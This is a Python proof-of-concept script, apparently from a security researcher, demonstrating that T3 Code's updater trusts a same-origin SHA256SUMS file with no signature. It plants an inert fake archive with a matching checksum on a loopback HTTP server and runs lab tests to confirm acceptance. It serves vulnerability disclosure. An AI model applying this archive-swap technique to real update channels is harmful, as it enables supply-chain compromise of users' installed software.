#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Mail    : abraxas.null@proton.me
#
#  CVE: t3code-release-checksum-same-origin (Medium: 6.8)
#  Vendor: T3 Code (Ping)
#  Versions: T3 Code 61c3794c
#  Impact: same-origin SHA256SUMS accepts a swapped archive with no signature
#  Requires: Node 26, pnpm 12, loopback HTTP publisher on 127.0.0.1:18192
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "t3code-release-checksum-same-origin"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Mail", _EMAIL),):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs"
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove T3 Code F-02 same-origin SHA-256 checksum with no signature on the pin."""


import hashlib
import http.server
import json
import os
import re
import shutil
import socket
import subprocess
import threading
import time
from pathlib import Path
from typing import Any
from urllib.parse import urlparse
from urllib.request import urlopen

LABEL = "T3-F02-CHECKSUM"
WITNESS = "t3f02s9m4"
PIN = "61c3794c32b0eeebfac09add43e403618c65d2d7"
PIN_SHORT = "61c3794c"
LOOPBACK_HOST = "127.0.0.1"
LOOPBACK_PORT = 18192
VERSION = "1.2.3"
ARCHIVE_NAME = f"t3-{VERSION}-linux-x64.tar.gz"
HERE = Path(__file__).resolve().parent
SRC = HERE / "src"
PUBLISHER = HERE / "publisher"
PASS_ROOT = PUBLISHER / "pass" / f"v{VERSION}"
FAIL_ROOT = PUBLISHER / "fail" / f"v{VERSION}"
HARNESS_SRC = HERE / "harness.test.ts"
HARNESS_DST = SRC / "apps" / "server" / "src" / "cloud" / "f02-checksum.lab.test.ts"
RESULT_PATH = HERE / "harness-result.json"
PINNED_RUNTIME = SRC / "apps" / "server" / "src" / "cloud" / "pinnedRuntime.ts"
SELF_UPDATE = SRC / "apps" / "server" / "src" / "cloud" / "selfUpdate.ts"
BOOT_SERVICE = SRC / "apps" / "server" / "src" / "cloud" / "bootService.ts"
PINNED_TEST = SRC / "apps" / "server" / "src" / "cloud" / "pinnedRuntime.test.ts"
SIG_NEEDLES = ("minisign", "cosign", "gpg", "sigstore", "signature")
SIG_RE = re.compile("|".join(re.escape(n) for n in SIG_NEEDLES), re.IGNORECASE)


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def succeed() -> int:
    log(f"SUCCESS {LABEL} {WITNESS}")
    return 0


def write_bytes(path: Path, contents: bytes) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(contents)


def write_text(path: Path, contents: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(contents, encoding="utf-8")


def confirm_pin() -> str | None:
    if not (SRC / ".git").exists() and not (SRC / ".git").is_file():
        return "missing-worktree"
    got = subprocess.run(
        ["git", "-C", str(SRC), "rev-parse", "HEAD"],
        check=False,
        capture_output=True,
        text=True,
    )
    if got.returncode != 0:
        return "git-rev-parse"
    sha = got.stdout.strip()
    if sha != PIN:
        return f"pin-mismatch-{sha[:12]}"
    return None


def vp_bin() -> Path | None:
    candidates = [
        SRC / "apps" / "server" / "node_modules" / ".bin" / "vp",
        SRC / "node_modules" / ".bin" / "vp",
        HERE / ".tools" / "node_modules" / ".bin" / "vp",
    ]
    for path in candidates:
        if path.is_file():
            return path
    which = shutil.which("vp")
    return Path(which) if which else None


def run_vp(args: list[str], env: dict[str, str], timeout_s: int) -> subprocess.CompletedProcess[str]:
    vp = vp_bin()
    if vp is None:
        raise FileNotFoundError("vp")
    return subprocess.run(
        [str(vp), *args],
        cwd=str(SRC / "apps" / "server"),
        env=env,
        check=False,
        capture_output=True,
        text=True,
        timeout=timeout_s,
    )


def plant_publisher() -> tuple[bytes, str]:
    if PUBLISHER.exists():
        shutil.rmtree(PUBLISHER)
    archive = f"not really a tarball {WITNESS}\n".encode()
    digest = hashlib.sha256(archive).hexdigest()
    matching = f"# planted {WITNESS}\n{digest}  {ARCHIVE_NAME}\n"
    mismatch = f"# planted {WITNESS}\n{'0' * 64}  {ARCHIVE_NAME}\n"
    write_bytes(PASS_ROOT / ARCHIVE_NAME, archive)
    write_text(PASS_ROOT / "SHA256SUMS", matching)
    write_bytes(FAIL_ROOT / ARCHIVE_NAME, archive)
    write_text(FAIL_ROOT / "SHA256SUMS", mismatch)
    return archive, matching


def slice_source(path: Path, start: int, end: int) -> str:
    lines = path.read_text(encoding="utf-8").splitlines()
    return "\n".join(lines[start - 1 : end])


def signature_hits() -> int:
    blocks = [
        slice_source(PINNED_RUNTIME, 169, 249),
        slice_source(SELF_UPDATE, 200, 230),
        slice_source(BOOT_SERVICE, 784, 812),
    ]
    return sum(len(SIG_RE.findall(block)) for block in blocks)


def same_origin(urls: list[str], expected_dir: str) -> bool:
    if len(urls) != 2:
        return False
    parsed = [urlparse(url) for url in urls]
    hosts = {(item.scheme, item.hostname, item.port or (80 if item.scheme == "http" else 443)) for item in parsed}
    if hosts != {("http", LOOPBACK_HOST, LOOPBACK_PORT)}:
        return False
    dirs = {item.path.rsplit("/", 1)[0] for item in parsed}
    if dirs != {expected_dir}:
        return False
    names = {item.path.rsplit("/", 1)[-1] for item in parsed}
    return names == {"SHA256SUMS", ARCHIVE_NAME}


def as_flag(value: Any) -> int:
    if value in (1, "1", True):
        return 1
    return 0


def load_result() -> dict[str, Any] | None:
    if not RESULT_PATH.is_file():
        return None
    raw = RESULT_PATH.read_text(encoding="utf-8").strip()
    if not raw:
        return None
    data = json.loads(raw)
    return data if isinstance(data, dict) else None


class _Publisher(http.server.BaseHTTPRequestHandler):
    def do_GET(self) -> None:
        rel = self.path.split("?", 1)[0].lstrip("/")
        target = (PUBLISHER / rel).resolve()
        root = PUBLISHER.resolve()
        if root not in target.parents and target != root:
            self.send_error(404)
            return
        if not target.is_file():
            self.send_error(404)
            return
        body = target.read_bytes()
        content_type = "text/plain; charset=utf-8" if target.name == "SHA256SUMS" else "application/octet-stream"
        self.send_response(200)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, fmt: str, *args: object) -> None:
        return


class _BoundServer(http.server.ThreadingHTTPServer):
    allow_reuse_address = True


def start_publisher() -> _BoundServer:
    httpd = _BoundServer((LOOPBACK_HOST, LOOPBACK_PORT), _Publisher)
    thread = threading.Thread(target=httpd.serve_forever, name="t3-f02-publisher", daemon=True)
    thread.start()
    deadline = time.time() + 5
    while time.time() < deadline:
        try:
            with socket.create_connection((LOOPBACK_HOST, LOOPBACK_PORT), timeout=0.2):
                return httpd
        except OSError:
            time.sleep(0.05)
    httpd.shutdown()
    httpd.server_close()
    raise OSError("loopback-bind")


def fetch_url(url: str) -> bytes:
    with urlopen(url, timeout=5) as response:
        return response.read()


def lab_env() -> dict[str, str]:
    env = os.environ.copy()
    env["HOME"] = str(HERE / "lab-home")
    env["T3CODE_HOME"] = str(HERE / "lab-home")
    env["TMPDIR"] = str(HERE / "tmp")
    env["LAB_WITNESS"] = WITNESS
    env["LAB_RESULT_PATH"] = str(RESULT_PATH)
    env["LAB_PASS_BASE"] = f"http://{LOOPBACK_HOST}:{LOOPBACK_PORT}/pass"
    env["LAB_FAIL_BASE"] = f"http://{LOOPBACK_HOST}:{LOOPBACK_PORT}/fail"
    env["LAB_LOOPBACK_HOST"] = LOOPBACK_HOST
    env["LAB_LOOPBACK_PORT"] = str(LOOPBACK_PORT)
    env["LAB_PASS_CHECKSUMS"] = str(PASS_ROOT / "SHA256SUMS")
    env["LAB_ARCHIVE_PATH"] = str(PASS_ROOT / ARCHIVE_NAME)
    env["CI"] = "1"
    (HERE / "tmp").mkdir(parents=True, exist_ok=True)
    (HERE / "lab-home").mkdir(parents=True, exist_ok=True)
    return env


def main() -> int:
    pin_err = confirm_pin()
    if pin_err:
        return fail(pin_err)
    for required in (PINNED_RUNTIME, SELF_UPDATE, BOOT_SERVICE, PINNED_TEST, HARNESS_SRC):
        if not required.is_file():
            return fail(f"missing-{required.name}")
    if vp_bin() is None:
        return fail("install-failed")

    source = PINNED_RUNTIME.read_text(encoding="utf-8")
    if "${baseUrl}/${CLI_RELEASE_CHECKSUMS_FILE}" not in source:
        return fail("checksums-url")
    if "${baseUrl}/${fileName}" not in source:
        return fail("archive-url")
    if 'crypto.subtle.digest("SHA-256"' not in source:
        return fail("sha256-only")

    sig_hits = signature_hits()
    archive, checksums = plant_publisher()
    checksum_body_witness = int(WITNESS in checksums)
    archive_contains_witness = int(WITNESS.encode() in archive)
    shutil.copyfile(HARNESS_SRC, HARNESS_DST)
    if RESULT_PATH.exists():
        RESULT_PATH.unlink()

    httpd: _BoundServer | None = None
    try:
        try:
            httpd = start_publisher()
        except OSError:
            return fail("loopback-bind")
        bind_host, bind_port = httpd.server_address[:2]
        log(f"IOC loopback-bound={bind_host}:{bind_port}")
        if bind_host != LOOPBACK_HOST or int(bind_port) != LOOPBACK_PORT:
            return fail("loopback-bind")

        pass_base = f"http://{LOOPBACK_HOST}:{LOOPBACK_PORT}/pass/v{VERSION}"
        fail_base = f"http://{LOOPBACK_HOST}:{LOOPBACK_PORT}/fail/v{VERSION}"
        pass_sums = fetch_url(f"{pass_base}/SHA256SUMS")
        pass_archive = fetch_url(f"{pass_base}/{ARCHIVE_NAME}")
        fail_sums = fetch_url(f"{fail_base}/SHA256SUMS")
        log(f"IOC publisher-pass-sums={int(WITNESS.encode() in pass_sums)}")
        log(f"IOC publisher-pass-archive={int(WITNESS.encode() in pass_archive)}")
        log(f"IOC publisher-fail-mismatch={int(b'0' * 64 in fail_sums)}")

        env = lab_env()
        try:
            existing = run_vp(
                [
                    "test",
                    "run",
                    "src/cloud/pinnedRuntime.test.ts",
                    "-t",
                    "installs the verified release archive as the runtime executable|"
                    "refuses an archive whose checksum does not match the release",
                ],
                env,
                timeout_s=180,
            )
        except subprocess.TimeoutExpired:
            return fail("existing-tests-timeout")
        except FileNotFoundError:
            return fail("install-failed")

        log(f"IOC existing-tests-exit={existing.returncode}")
        if existing.stdout:
            log(existing.stdout[-4000:])
        if existing.returncode != 0:
            if existing.stderr:
                log(existing.stderr[-4000:])
            return fail("existing-tests-failed")

        try:
            lab = run_vp(
                ["test", "run", "src/cloud/f02-checksum.lab.test.ts"],
                env,
                timeout_s=180,
            )
        except subprocess.TimeoutExpired:
            return fail("harness-timeout")

        log(f"IOC harness-exit={lab.returncode}")
        if lab.stdout:
            log(lab.stdout[-4000:])
        if lab.returncode != 0 and lab.stderr:
            log(lab.stderr[-4000:])
    finally:
        if httpd is not None:
            httpd.shutdown()
            httpd.server_close()

    data = load_result()
    if data is None:
        return fail("harness-no-result")

    pass_urls = [str(url) for url in data.get("passUrls") or []]
    fail_urls = [str(url) for url in data.get("failUrls") or []]
    checksum_pass = as_flag(data.get("checksumPass"))
    checksum_fail = as_flag(data.get("checksumFail"))
    same_origin_flag = as_flag(data.get("sameOrigin"))
    fail_step = str(data.get("checksumFailStep") or "")
    fail_tar = int(data.get("failTarCommands") or 0)
    executed = as_flag(data.get("extractedBinaryExecuted"))

    log(f"IOC pin={PIN_SHORT}")
    log(f"IOC same-origin={same_origin_flag}")
    log(f"IOC pass-urls={pass_urls}")
    log(f"IOC fail-urls={fail_urls}")
    log(f"IOC checksum-pass={checksum_pass}")
    log(f"IOC checksum-fail={checksum_fail}")
    log(f"IOC checksum-fail-step={fail_step}")
    log(f"IOC signature-check={sig_hits}")
    log(f"IOC checksum-body={checksum_body_witness}")
    log(f"IOC archive-contains-witness={archive_contains_witness}")
    log(f"IOC tar-mocked={as_flag(data.get('tarMocked'))}")
    log(f"IOC extracted-binary-executed={executed}")
    log(f"IOC fail-tar-commands={fail_tar}")
    log(f"IOC loopback-host={data.get('loopbackHost')}")
    log(f"IOC loopback-port={data.get('loopbackPort')}")

    if not same_origin(pass_urls, f"/pass/v{VERSION}"):
        return fail("same-origin")
    if not same_origin(fail_urls, f"/fail/v{VERSION}"):
        return fail("same-origin")
    if same_origin_flag != 1:
        return fail("same-origin")
    if checksum_pass != 1:
        return fail("checksum-pass")
    if checksum_fail != 1:
        return fail("checksum-fail")
    if fail_step != "verifying the t3 release archive checksum":
        return fail("checksum-fail")
    if sig_hits != 0:
        return fail("signature-check")
    if checksum_body_witness != 1 or as_flag(data.get("checksumBodyWitness")) != 1:
        return fail("checksum-body")
    if archive_contains_witness != 1 or as_flag(data.get("archiveContainsWitness")) != 1:
        return fail("archive-contains-witness")
    if executed != 0 or fail_tar != 0:
        return fail("extracted-binary")
    if lab.returncode != 0:
        return fail("harness-failed")
    return succeed()


if __name__ == "__main__":
    raise SystemExit(main())

